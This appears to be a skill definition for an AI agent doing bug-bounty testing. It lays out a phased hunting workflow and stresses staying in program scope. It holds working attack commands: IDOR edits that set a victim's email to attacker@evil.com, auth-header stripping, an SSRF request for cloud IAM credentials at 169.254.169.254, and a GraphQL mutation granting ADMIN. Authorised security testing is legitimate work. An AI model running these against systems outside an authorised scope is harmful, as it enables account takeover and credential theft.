---
description: Start hunting on a target — loads scope, reads disclosed reports, picks best attack surface based on tech stack, runs targeted vuln checks. Usage: /hunt target.com [--vuln-class ssrf|idor|xss|sqli|oauth|race|graphql|llm|upload|business-logic]
---

# /hunt

Active vulnerability hunting on a target.

## What This Does

1. Reads program scope (in-scope assets, exclusions, payment behavior)
2. Loads recon output from `recon/<target>/` if available
3. Detects tech stack and maps to primary bug classes
4. Runs targeted tests for the highest-ROI bug classes
5. Documents findings with exact HTTP requests

## Usage

```
/hunt target.com
/hunt target.com --vuln-class idor
/hunt target.com --vuln-class ssrf
/hunt target.com --vuln-class graphql
/hunt target.com --source-code   (if repo is available)
```

## Phase 1: Read Before Touching (15 min)

### Read Program Scope
```
1. Go to program page (HackerOne/Bugcrowd/Intigriti)
2. Note ALL in-scope domains — only test these
3. Note ALL out-of-scope domains — never test these (Vienna: /advuew/* excluded!)
4. Note impact types accepted (some exclude "low" severity)
5. Check average bounty — signals program generosity
```

### Read Disclosed Reports (Intel)
```bash
# HackerOne Hacktivity for this program:
# https://hackerone.com/TARGET_NAME/hacktivity

# Search by bug class:
# https://hackerone.com/hacktivity?querystring=TARGET_NAME+IDOR
# https://hackerone.com/hacktivity?querystring=TARGET_NAME+SSRF

# Extract from each report:
# 1. Which endpoint
# 2. Which bug class
# 3. What parameter
# 4. What check was missing
# 5. What they paid
```

## Phase 2: Tech Stack Detection (2 min)

```bash
TARGET="target.com"

curl -sI https://$TARGET | grep -iE "server|x-powered-by|x-aspnet|x-runtime|x-generator"

# Stack → Primary bug class:
# Ruby on Rails  → mass assignment, IDOR
# Django         → IDOR (ModelViewSet), SSTI
# Flask          → SSTI (render_template_string), SSRF
# Laravel        → mass assignment, IDOR
# Express/Node   → prototype pollution, path traversal
# Spring Boot    → Actuator endpoints, SSTI
# Next.js        → SSRF via Server Actions, open redirect
# GraphQL        → introspection, IDOR via node(), auth bypass on mutations
```

## Caido Setup (run once per session)

```bash
CAIDO="npx tsx ~/.claude/skills/caido-mode/caido-client.ts"

# Verify Caido is running
$CAIDO health

# Create scope for this target so all traffic is captured
$CAIDO create-scope "$TARGET" --allow "*.$TARGET"

# Create environment to store attacker/victim account data
ENV_ID=$($CAIDO create-env "hunt-$TARGET" | jq -r '.id')
$CAIDO env-set $ENV_ID attacker_id "YOUR_ATTACKER_USER_ID"
$CAIDO env-set $ENV_ID victim_id "YOUR_VICTIM_USER_ID"

# Check what proxy history already exists for this target
$CAIDO search "req.host.cont:\"$TARGET\"" --limit 20
```

**Key principle:** Find an authenticated request in Caido proxy history, then use `edit` to modify just the path/body/ID — all cookies and auth tokens are preserved automatically.

## Phase 3: Active Testing

### IDOR Testing (highest ROI)

```bash
CAIDO="npx tsx ~/.claude/skills/caido-mode/caido-client.ts"

# Find authenticated requests to the target endpoint in proxy history
$CAIDO search 'req.path.cont:"/api/user"' --limit 10

# Test IDOR by changing the ID — auth headers preserved automatically
$CAIDO edit <request-id> --path /api/user/VICTIM_ID
$CAIDO edit <request-id> --replace "attacker_id:::victim_id"

# Test HTTP method variations (DELETE/PUT often lack ownership checks)
$CAIDO edit <request-id> --method DELETE
$CAIDO edit <request-id> --method PUT --body '{"email":"attacker@evil.com"}'

# Test API version differences
$CAIDO edit <request-id> --path /api/v1/user/VICTIM_ID

# Log confirmed IDOR as a Caido finding
$CAIDO create-finding <request-id> --title "IDOR on [endpoint]" --description "[impact]"

# Export curl for PoC in report
$CAIDO export-curl <request-id>
```

### Auth Bypass Testing

```bash
CAIDO="npx tsx ~/.claude/skills/caido-mode/caido-client.ts"

# Check siblings — find authenticated request to one endpoint
$CAIDO search 'req.path.cont:"/api/users/"' --limit 10

# Test sibling endpoints by changing path (auth preserved)
for ep in export delete share archive download restore transfer admin; do
  $CAIDO edit <request-id> --path "/api/users/123/$ep" --compact
done

# Remove auth entirely and replay
$CAIDO edit <request-id> --remove-header "Authorization" --compact
$CAIDO edit <request-id> --remove-header "Cookie" --compact
```

### SSRF Testing

```bash
# Find URL parameters in recon output
cat recon/$TARGET/ssrf-candidates.txt | head -20

# Test with cloud metadata
# Use interactsh for OOB confirmation:
interactsh-client &
INTERACT_URL="http://$(interactsh-client --poll)"

# Test payloads:
curl "https://target.com/api/image?url=$INTERACT_URL"
curl "https://target.com/api/webhook" -d "{\"url\": \"$INTERACT_URL\"}"

# If DNS callback confirmed → escalate to internal:
curl "https://target.com/api/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

### GraphQL Testing

```bash
# Introspection check
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# If introspection on → enumerate mutations
# Look for: createUser, deletePost, updateRole, assignAdmin

# Test auth bypass on mutations:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { updateUserRole(userId: 456, role: ADMIN) { success } }"}'
# Without auth header — does it work?
```

## Phase 4: The A→B Signal Method

When you confirm bug A, immediately check for B and C:

| Found A | Check B | Check C |
|---|---|---|
| IDOR on GET | IDOR on PUT/DELETE same path | IDOR on sibling endpoints |
| Auth bypass on endpoint | Every sibling in same controller | Old API version |
| Stored XSS | Does admin view it? (priv esc) | Email/export/PDF rendering |
| SSRF DNS callback | Internal services (169.254.x.x) | SSRF via open redirect |
| S3 listing | JS bundles → grep secrets | .env files in bucket |
| OAuth no PKCE | CSRF on OAuth flow | Auth code reuse |
| Race on coupons | Race on credits/wallet | Race on rate limits |

**3 rules before pursuing B:**
1. Confirm A is real first (exact HTTP request + response)
2. B must be a DIFFERENT bug (different endpoint OR mechanism OR impact)
3. B must pass Gate 0 independently

## Phase 5: Document Findings

Create `targets/<target>/SESSION.md`:

```markdown
# TARGET: target.com | DATE: [today] | CROWN JEWEL: [what attacker wants most]

## Active Leads
- [14:22] /api/v2/invoices/{id} — no ownership check visible. Testing...
- [14:35] User-Agent reflected in error — checking if stored

## Dead Ends (don't revisit)
- /admin → IP restricted. Hard stop.

## Anomalies
- GET /api/export → 200 even without session cookie

## Confirmed Bugs
- [15:10] IDOR on /api/invoices/{id} — read+write from attacker session
```

## 20-Minute Rotation Rule

Every 20 min ask: "Am I making progress?" No → rotate to next endpoint or vuln class.
**Fresh context finds more bugs than brute force.**

## Stop Signals (move on if you see these)

- 403 no matter what you try
- 20+ payload variations, identical response
- Finding needs 5+ simultaneous preconditions
- 30+ min on same endpoint with no progress
